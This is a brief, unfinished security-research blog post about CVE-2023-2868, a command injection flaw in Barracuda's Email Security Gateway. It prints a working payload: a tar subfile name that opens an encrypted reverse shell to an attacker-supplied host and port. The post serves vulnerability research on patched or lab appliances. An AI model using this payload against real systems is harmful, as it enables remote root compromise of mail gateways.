---
layout: post
title: CVE-2023-2868 - Diving Deeper To Total Device Compromise
subtitle: WIP
tags: hax cve barracuda pwn
date: 2025-08-20
background: https://lh3.googleusercontent.com/d/1JdPaNUt37-WV675cbqsskjcuJp0akekw
---
# CVE-2023-2868
Some of my past research work involved crafting one of the first public proof of concepts for CVE-2023-2868, a command injection vulnerability in Barracuda's Email Security Gateway appliance. My writeup can be found on [AttackerKB](https://attackerkb.com/topics/2Z0CWopGPX/cve-2023-2868/rapid7-analysis), and my original ruby PoC code can be found [here](https://github.com/cfielding-r7/poc-cve-2023-2868).

## TL;DR - PER MY LAST WRITEUP ;P
[CVE-2023-2868](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally/) is a command injection vulnerability in Barracuda ESG's custom wrapper for `amavisd`. A `.tar` file in the following format would trigger RCE: 
```
randomLetters.tar < - name of the tar file
    - `setsid sh -c "mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect #{LHOST}:#{LPORT} >/tmp/p 2>/dev/null;rm /tmp/p"`
      ^ The filename of a subfile within the tar file; subfile contents are random.  
```
This is a reconstruction of the details hinted at in [Mandiant's Blog](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally/), and works exactly as-is. 


## New Beginnings 
The vulnerability was patched in updates following the aforementioned blogs. However, for those who have an ESG appliance on their kitchen counter (lacking said security patches), CVE-2023-2868 can be used to get a root shell for further research. This post will explore that opportunity. 

WIP